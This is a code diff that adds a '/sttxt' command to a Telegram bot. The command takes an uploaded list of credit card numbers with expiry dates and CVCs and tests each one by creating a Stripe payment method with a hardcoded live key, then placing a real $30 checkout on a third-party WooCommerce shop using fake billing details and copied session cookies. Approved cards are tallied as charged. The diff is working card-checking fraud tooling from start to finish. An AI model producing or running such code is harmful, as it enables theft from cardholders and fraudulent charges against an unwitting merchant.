@@ -1025,6 +1025,248 @@ async def stripe_check_handler(client: Client, message: Message):
         if 'proc_msg' in locals():
             await proc_msg.delete()
 
+# Add this handler to your script
+@app.on_message(filters.command("sttxt") & filters.reply)
+async def stripe_txt_check_handler(client: Client, message: Message):
+    try:
+        # Check if replied message has a document
+        if not message.reply_to_message.document:
+            await message.reply("❗ Please reply to a text file with `/sttxt`")
+            return
+
+        # Check if file is txt
+        if not message.reply_to_message.document.file_name.endswith('.txt'):
+            await message.reply("❗ Please reply to a .txt file")
+            return
+
+        # Send initial processing message
+        proc_msg = await message.reply("↯ Processing your file via Stripe [30$ per card], please wait...")
+
+        # Download the file
+        file_path = await message.reply_to_message.download()
+        
+        # Read the file
+        with open(file_path, 'r') as f:
+            cc_lines = f.read().splitlines()
+
+        # Remove empty lines and validate CC format
+        valid_ccs = []
+        for line in cc_lines:
+            line = line.strip()
+            if re.match(r"\d{13,16}\|\d{2}\|\d{2,4}\|\d{3,4}", line):
+                valid_ccs.append(line)
+
+        total_ccs = len(valid_ccs)
+        if total_ccs == 0:
+            await proc_msg.edit("❌ No valid CCs found in the file.")
+            os.remove(file_path)
+            return
+
+        # Initialize counters
+        approved = 0
+        declined = 0
+        error = 0
+        total_spent = 0  # Track total amount spent (30$ per approved card)
+        start_time = time.time()
+        last_update = time.time()
+        
+        # Prepare results list
+        results = []
+        results.append("Card Details                        | Status          | Response")
+        results.append("------------------------------------|-----------------|-----------------")
+
+        # Process each CC
+        processed = 0
+        for cc in valid_ccs:
+            try:
+                # Update progress every 5 seconds
+                current_time = time.time()
+                if current_time - last_update >= 5:
+                    elapsed = current_time - start_time
+                    eta = (elapsed / (processed + 1)) * (total_ccs - processed - 1)
+                    
+                    progress_msg = (
+                        f"↯ Processing your file via Stripe [30$ per card], please wait...\n\n"
+                        f"✧ Total Cards: {total_ccs}\n"
+                        f"✧ Checked: {processed}/{total_ccs}\n"
+                        f"✧ Approved: {approved} ✅ (${approved * 30})\n"
+                        f"✧ Declined: {declined} ❌\n"
+                        f"✧ Errors: {error} ⚠️\n"
+                        f"✧ ETA: {eta:.2f}s remaining"
+                    )
+                    
+                    await proc_msg.edit(progress_msg)
+                    last_update = current_time
+
+                # Process the CC using Stripe checker logic
+                cc_parts = cc.split("|")
+                if len(cc_parts) < 4:
+                    results.append(f"{cc.ljust(35)}| ERROR ⚠️       | Invalid format")
+                    error += 1
+                    processed += 1
+                    continue
+
+                cc_num, mnt, yr, cvc = cc_parts[:4]
+                
+                # First request to get payment method
+                headers = {
+                    'authority': 'api.stripe.com',
+                    'accept': 'application/json',
+                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'origin': 'https://js.stripe.com',
+                    'referer': 'https://js.stripe.com/',
+                    'user-agent': 'Mozilla/5.0 (Linux; Android 15; SM-X216B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+                }
+
+                data = f'type=card&billing_details[name]=Habud+Kus&billing_details[address][city]=Lobe+&billing_details[address][country]=FI&billing_details[address][line1]=Rantakyl%C3%A4nkatu+2&billing_details[address][postal_code]=80160&billing_details[email]=gecodo9246%40mvpmedix.com&billing_details[phone]=013+2635544&card[number]={cc_num}&card[cvc]={cvc}&card[exp_month]={mnt}&card[exp_year]={yr}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F2e00b582bb%3B+stripe-js-v3%2F2e00b582bb%3B+split-card-element&referrer=https%3A%2F%2Fshop.dairlab.com&time_on_page=427267&client_attribution_metadata[client_session_id]=3f95b03a-1483-4628-9a69-2b624b78f3b5&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51H70VWFJYq0SkRDBdQBb45H4LBKAsA8bzspunFznrztuwSML8mfbiALnUysBGvGfR0Iko3gCZKbzfIVTYmMJuUs500VwwmFMY8&_stripe_account=acct_1H70VWFJYq0SkRDB&_stripe_version=2022-08-01'
+
+                response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
+                op = response.json()
+                
+                if 'error' in op:
+                    # Handle error from first request
+                    results.append(f"{cc.ljust(35)}| DECLINED ❌    | {op.get('error', {}).get('message', 'your card has been declined ❌️')}")
+                    declined += 1
+                    processed += 1
+                    continue
+                
+                payment_id = op["id"]
+                
+                # Second request to process payment
+                cookies = {
+                    '_ga': 'GA1.1.483482794.1753196710',
+                    'pys_first_visit': 'true',
+                    'pysTrafficSource': 'shop.dairlab.com',
+                    'pys_landing_page': 'https://shop.dairlab.com/en/shop/',
+                    'last_pysTrafficSource': 'shop.dairlab.com',
+                    '_fbp': 'fb.1.1753196719527.8870665683',
+                    'wp_woocommerce_session_9a2bba88407b1bc30c9ee7c85f22e029': 't_0d80916dd2246bac201b1e151b422a%7C%7C1753369553%7C%7C1753365953%7C%7C3a74820485066e64144375f1ac6eadbd',
+                    'woocommerce_items_in_cart': '1',
+                    'woocommerce_cart_hash': 'a9ad4d74c641309b60ea53e0b35d1d02',
+                    'sbjs_migrations': '1418474375998%3D1',
+                    'sbjs_current_add': 'fd%3D2025-07-23%2000%3A50%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.dairlab.com%2Fen%2Fcheckout-2%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fshop.dairlab.com%2Fen%2Fcart%2F',
+                    'sbjs_first_add': 'fd%3D2025-07-23%2000%3A50%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.dairlab.com%2Fen%2Fcheckout-2%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fshop.dairlab.com%2Fen%2Fcart%2F',
+                    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+                    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+                    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2015%3B%20SM-X216B%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F107.0.0.0%20Safari%2F537.36',
+                    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fshop.dairlab.com%2Fen%2Fcheckout-2%2F',
+                    'wp-wpml_current_language': 'en',
+                    'pys_session_limit': 'true',
+                    'pys_start_session': 'true',
+                    'last_pys_landing_page': 'https://shop.dairlab.com/en/checkout-2/',
+                    '_iub_cs-55879968': '%7B%22timestamp%22%3A%222025-07-22T15%3A05%3A07.226Z%22%2C%22version%22%3A%221.82.0%22%2C%22purposes%22%3A%7B%221%22%3Atrue%2C%223%22%3Atrue%2C%224%22%3Atrue%2C%225%22%3Atrue%7D%2C%22id%22%3A55879968%2C%22cons%22%3A%7B%22rand%22%3A%22968f3f%22%7D%7D',
+                    'usprivacy': '%7B%22uspString%22%3A%221YN-%22%2C%22firstAcknowledgeDate%22%3A%222025-07-22T15%3A05%3A03.587Z%22%2C%22optOutDate%22%3Anull%7D',
+                    '_iub_previous_preference_id': '%7B%2255879968%22%3A%222025%2F07%2F22%2F15%2F05%2F07%2F226%2F968f3f%22%7D',
+                    '_iub_cs-55879968-uspr': '%7B%22s%22%3Atrue%2C%22sh%22%3Atrue%2C%22adv%22%3Atrue%7D',
+                    '_clck': 'chprdb%7C2%7Cfxu%7C0%7C2029',
+                    '_gcl_au': '1.1.39723286.1753196702.670944567.1753233890.1753233890',
+                    '_ga_C2ZLCKEYMD': 'GS2.1.s1753233645$o2$g1$t1753234052$j60$l0$h0',
+                }
+
+                headers = {
+                    'authority': 'shop.dairlab.com',
+                    'accept': 'application/json, text/javascript, */*; q=0.01',
+                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'origin': 'https://shop.dairlab.com',
+                    'referer': 'https://shop.dairlab.com/en/checkout-2/',
+                    'user-agent': 'Mozilla/5.0 (Linux; Android 15; SM-X216B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+                    'x-requested-with': 'XMLHttpRequest',
+                }
+
+                params = {
+                    'wc-ajax': 'checkout',
+                }
+
+                data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fshop.dairlab.com%2Fen%2Fcart%2F&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fshop.dairlab.com%2Fen%2Fcheckout-2%2F&wc_order_attribution_session_start_time=2025-07-23+00%3A50%3A36&wc_order_attribution_session_pages=1&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+15%3B+SM-X216B)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F107.0.0.0+Safari%2F537.36&billing_first_name=Habud&billing_last_name=Kus&billing_country=FI&billing_address_1=Rantakyl%C3%A4nkatu+2&billing_address_2=&billing_postcode=80160&billing_city=Lobe+&billing_state=&billing_phone=013+2635544&billing_email=gecodo9246%40mvpmedix.com&shipping_first_name=&shipping_last_name=&shipping_country=FI&shipping_address_1=&shipping_address_2=&shipping_postcode=&shipping_city=&shipping_state=&order_comments=&shipping_method%5B0%5D=free_shipping%3A2&lang=en&payment_method=stripe_cc&stripe_cc_token_key={payment_id}&stripe_cc_payment_intent_key=&terms=on&terms-field=1&woocommerce-process-checkout-nonce=2430687dcb&_wp_http_referer=%2Fen%2F%3Fwc-ajax%3Dupdate_order_review&pys_utm=utm_source%3Aundefined%7Cutm_medium%3Aundefined%7Cutm_campaign%3Aundefined%7Cutm_term%3Aundefined%7Cutm_content%3Aundefined&pys_utm_id=fbadid%3Aundefined%7Cgadid%3Aundefined%7Cpadid%3Aundefined%7Cbingid%3Aundefined&pys_browser_time=06-07%7CWednesday%7CJuly&pys_landing=https%3A%2F%2Fshop.dairlab.com%2Fen%2Fshop%2F&pys_source=shop.dairlab.com&pys_order_type=normal&last_pys_landing=https%3A%2F%2Fshop.dairlab.com%2Fen%2Fshop%2F&last_pys_source=shop.dairlab.com&last_pys_utm=utm_source%3Aundefined%7Cutm_medium%3Aundefined%7Cutm_campaign%3Aundefined%7Cutm_term%3Aundefined%7Cutm_content%3Aundefined&last_pys_utm_id=fbadid%3Aundefined%7Cgadid%3Aundefined%7Cpadid%3Aundefined%7Cbingid%3Aundefined'
+
+                response = requests.post(
+                    'https://shop.dairlab.com/en/',
+                    params=params,
+                    cookies=cookies,
+                    headers=headers,
+                    data=data,
+                    timeout=30
+                )
+                
+                response_text = response.text.lower()
+                
+                if 'declined' in response_text:
+                    results.append(f"{cc.ljust(35)}| DECLINED ❌    | your card has been declined ❌️")
+                    declined += 1
+                else:
+                    results.append(f"{cc.ljust(35)}| APPROVED ✅    | 30$ CHARGED ✅️✅️👌")
+                    approved += 1
+                    total_spent += 30  # Add $30 for each approved card
+
+                processed += 1
+
+            except Exception as e:
+                results.append(f"{cc.ljust(35)}| ERROR ⚠️       | {str(e)}")
+                error += 1
+                processed += 1
+                continue
+
+        # Final stats
+        elapsed = time.time() - start_time
+        
+        # Save results to file
+        username = message.from_user.username or str(message.from_user.id)
+        result_filename = f"stripe_check_results_{username}.txt"
+        with open(result_filename, 'w') as f:
+            f.write("\n".join(results))
+
+        # Prepare caption
+        caption = (
+            f"─────── ⸙ ────────\n"
+            f"↯ 𝗦𝗧𝗥𝗜𝗣𝗘 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 [30$ per card]\n\n"
+            f"✧ 𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀: {total_ccs}\n"
+            f"✧ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: {approved} ✅ (${total_spent})\n"
+            f"✧ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {declined} ❌\n"
+            f"✧ 𝗘𝗿𝗿𝗼𝗿𝘀: {error} ⚠️\n"
+            f"✧ 𝗧𝗶𝗺𝗲: {elapsed:.2f}s\n\n"
+            f"✧ 𝗧𝗢𝗧𝗔𝗟 𝗔𝗠𝗢𝗨𝗡𝗧 𝗦𝗣𝗘𝗡𝗗𝗘𝗗: ${total_spent}\n"
+            f"✧ (1 APPROVED = 30$)\n\n"
+            f"↯ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: @{username}\n"
+            f"─────── ⸙ ────────"
+        )
+
+        # Send results and clean up
+        await message.reply_document(
+            document=result_filename,
+            caption=caption,
+            quote=True
+        )
+        await proc_msg.delete()
+        
+        # Clean up files
+        os.remove(file_path)
+        os.remove(result_filename)
+
+        # Log to channel
+        log_text = (
+            f"📁 **Stripe Mass CC Check Completed**\n"
+            f"**User:** [{message.from_user.first_name}](tg://user?id={message.from_user.id}) (`{message.from_user.id}`)\n"
+            f"**File:** `{message.reply_to_message.document.file_name}`\n"
+            f"**Total Cards:** {total_ccs}\n"
+            f"**Approved:** {approved} (${total_spent})\n"
+            f"**Declined:** {declined}\n"
+            f"**Errors:** {error}\n"
+            f"**Time Taken:** {elapsed:.2f}s"
+        )
+        await log_to_channel(client, "CC", message, f"File: {message.reply_to_message.document.file_name}", log_text)
+
+    except Exception as e:
+        logging.error(f"Stripe mass CC check error: {e}")
+        await message.reply(f"❌ Error processing file: {str(e)}")
+        if 'proc_msg' in locals():
+            await proc_msg.delete()
+        if 'file_path' in locals() and os.path.exists(file_path):
+            os.remove(file_path)
+        if 'result_filename' in locals() and os.path.exists(result_filename):
+            os.remove(result_filename)
+
 if __name__ == "__main__":
     print("🚀 Combined Bot is running with /ai, /chk and /gen commands...")
     loop = asyncio.get_event_loop()
